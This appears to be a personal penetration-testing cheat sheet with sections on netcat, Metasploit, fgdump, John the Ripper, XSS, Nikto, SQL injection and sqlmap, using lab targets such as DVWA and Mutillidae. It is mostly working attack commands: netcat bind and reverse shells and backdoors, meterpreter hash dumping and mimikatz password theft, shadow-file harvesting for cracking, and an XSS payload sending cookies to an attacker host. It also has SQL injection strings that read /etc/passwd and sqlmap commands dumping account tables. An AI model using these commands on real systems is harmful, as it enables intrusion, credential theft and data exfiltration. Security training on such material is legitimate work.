#@ Keyword Search @#
NETCAT
XSS
NIKTO
SQL
SQLMAP
METASPLOIT
JOHN
FGDUMP

#@##########################@#
#@                          @#
#@           NETCAT         @#
#@                          @#
#@##########################@#

#^ netcat port scanner

nc -v -w3 -z [targetIP] [startport]-[endport]

#^ move file from listener to client

nc -l -p [port] < [filename]  # listener
nc [listenerIP] [port] > [filename]  #client

#^ move file from client to listener

nc -l -p [port] > [filename]  # listener
nc [listenerIP] [port] < [filename]  #client

#^ create login prompt backdoor

nc -l -p [port] -e /bin/sh  #linux
nc -l -p [port] -e cmd.exe  #windows

#^ create reverse shell

nc -l -p [port]  #listener
nc [listenerIP] [port] -e /bin/sh #client (linux)
nc [listenerIP] [port] -e cmd.exe #client (windows)

#^ create one-way netcat relay on Middle Man

nc -l -p incoming-port | nc target_server outgoing_port
#Example: nc -l -p 11111 | nc 192.168.123.2 54321

#@ netcat relay backpipe method

#^ On Windows
echo nc next_hop 54321 > ncrelay.bat
nc -l -p 11111 -e ncrelay.bat

#^ On Linux
cd /tmp
mknod backpipe p
nc -l -p [port] 0<backpipe | nc [next_hop_ip] [port] 1>backpipe

#^ netcat backdoor without -e option

cd /tmp
mknod backpipe p
/bin/bash 0<backpipe | nc -l -p [port] 1>backpipe

#@##########################@#
#@                          @#
#@        METASPLOIT        @#
#@                          @#
#@##########################@#

#^ start metasploit
service postgresql start
./msfconsole

#^ Search for types of exploits in msfconsole

search <keyword>

#^Search for keyword in exploit modules

search -t exploit <keyword>

#^ Search for keyword in payload modules

search -t payload <keyword>

#^ Set exploit to use

use [Exploit_Name]  ^^Example: use windows/smb/ms08_067_netapi 

#^ show available payloads for exploit

show payloads

#^ Set payload to use

set PAYLOAD [Payload_Name]  #Example: set PAYLOAD windows/meterpreter/reverse_tcp

#^ Show payload options

show options

#^ Set the payload options

set [Option_Name] <value>  #Example: set RHOST 10.10.210.40

#^ Send Exploit

exploit

#^ Get hashes when in meterpreter

hashdump  #gets password hashes from memory
run hashdump  #gets password hashes from registry

#^ Get a windows shell when in in meterpreter

shell

#^ Get clear text passwords
load mimikatz
wdigest

#^ Kick meterpreter shell to yourself
run duplicate

#^ Kick meterpreter shell to a remote AP
run duplicate -r [ap_ip] -p [ap_port]

#^ Setup persistent handler
use exploit/multi/handler
set ExitOnSession false

#^ Identify Windows Service Pack
use auxiliary/scanner/smb/smb_version
set RHOSTS [ip_address_or_range]
run

#^ Enumerate a windows target (Gets all kinds of info including hashdump)
run Winenum

#^ Find files of a particular format, get list (contained in pic.txt) and download
run file_collector -r -d c:\\ -f *.jpg -o /root/pic.txt

#^ To download files ,delete unwanted files from list (pic.txt)
run file_collector -i root/pic.txt -l root/Downloads

#^ Find out security measures on target (including firewall configuration)
run getcountermeasures

#^ Scan for other devices on target's network
run post/windows/gather/arp_scanner RHOSTS=[ip_addr_range/CIDR]

#@##########################@#
#@                          @#
#@          FGDUMP          @#
#@                          @#
#@##########################@#

#^ Dump remote windows passwords

fgdump.exe -h [targetIP] -u [username] -p [password]

#@##########################@#
#@                          @#
#@          JOHN            @#
#@                          @#
#@##########################@#

#^ Change to the John directory

cd /home/tools/john-1.7.2/run

#^ To start default password cracking

john [target_hashfile]

#^ To harvest hashes in linux to use against John

cp /etc/passwd /tmp/password.copy
cp /etc/shadow /tmp/shadow.copy

./unshadow /tmp/password.copy /tmp/shadow.copy > /tmp/combined

./john /tmp/combined


#@##########################@#
#@                          @#
#@        XSS ATTACK        @#
#@                          @#
#@##########################@#

#^ In comment field to trigger a connection back to nc listener to get the user cookie

<script>document.location='http://[ap_ip]:2222/grab.cgi?'+document.cookie;</script>    #note that the + sign might need to be %2b

#^ make note of the user and cookie  Example Cookie: user=<cookie#>  or Cookie: user=1337

#@##########################@#
#@                          @#
#@          NIKTO           @#
#@                          @#
#@##########################@#

#^ Using cookie we gathered from above, see if we can get to admin page

cd /home/tools/nikto-2.02
perl ./nikto.pl -Single

Hostname: [target_ip]
URI(/): /admin.php
Data:Cookie: [name]=[value]

#@##########################@#
#@                          @#
#@       SQL INJECTION      @#
#@                          @#
#@##########################@#

#^ Basic Blind SQL Injection
#^ See if you can get errors or get logged in

' or 1=1 -- <- Space after double-hyphen -
' or (1=1 and username='jeremy') --    <-|

#@ Getting more information

#^ We need to make sure that we are addressing the current
#^ number of columns that php (in this case) will address.
#^ Using the 'union' statement along with null's is "trial-and-arror"
#^ The 'union' operator is used to combine the result-set of two or more
#^ 'select' statements.  Each 'select' statement within the 'union' must
#^ have the same number of columns.  The columns must also have similar
#^ data types.  You need to start with one 'null' and keep incrementing
#^ until you don't get an error (in the below case, it took 5 nulls).
#^ Then replace a null with a 1 and see where it comes back in the output.
#^ The injection in this case was:

'union select null,null,null,null,null -- 

#^ We verified by injecting the number '1' into a returned column

'union select null,1,null,null,null -- 

#^ Then we asked for the name of the database

'union select null,database(),null,null,null --

#^ Check to see if you can dump a file to the target (gives error, but should work)

'union select null,1,null,null,null INTO DUMPFILE 'test.txt' -- 

#^ Load file from target

'union select null,load_file('/etc/passwd'),null,null,null --    

#@ Below are examples of sql injections performed in the URL.

#^ Special symbols include:
#^	+   : 	space
#^	%27 :	' (single-quote)
#^	%28 :	( (open parenthesis)
#^	%29 :	) (closed parenthesis)

#^ List SQL tables of current database example
http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=%27+union+select+null+group_concat%28table_name%29+from+information_schema.tables+where+table_schema=database%28%29+--+&submit=Submit#

#^ List SQL Columns from Current Database
http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=%27+union+select+null+group_concat%28column_name%29+from+information_schema.columns+where+table_schema=database%28%29+--+&Submit=Submit#

#^ List the values of the users table (0x3a is a : (colon) to seperate values in output
http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=%27+union+select+null+group_concat%28user,%0x3a,password%29+from+users+--+&Submit=Submit#

#@ SQLMAP

#^ You can use BurpSuite or ZAP to get url, cookies, data

#^ Using mutillidae example, check to see if injectable and list databases
sqlmap -u 'http://192.168.56.101/mutillidae/index.php?page=login.php' --cookie='showhints=1; PHPSESSID=ee2b8dbb1533756625fabf6011ad72f4' --data='username=ja+&password=ja+&login-php-submit-button=Login' --dbs

#^ Using mutillidae example, list tables of owasp10 database
sqlmap -u 'http://192.168.56.101/mutillidae/index.php?page=login.php' --cookie='showhints=1; PHPSESSID=ee2b8dbb1533756625fabf6011ad72f4' --data='username=ja+&password=ja+&login-php-submit-button=Login' --tables

#^ Using mutillidae example, dump data from accounts table in owasp10 database
sqlmap -u 'http://192.168.56.101/mutillidae/index.php?page=login.php' --cookie='showhints=1; PHPSESSID=ee2b8dbb1533756625fabf6011ad72f4' --data='username=ja+&password=ja+&login-php-submit-button=Login' -D owasp10 -T accounts --dump

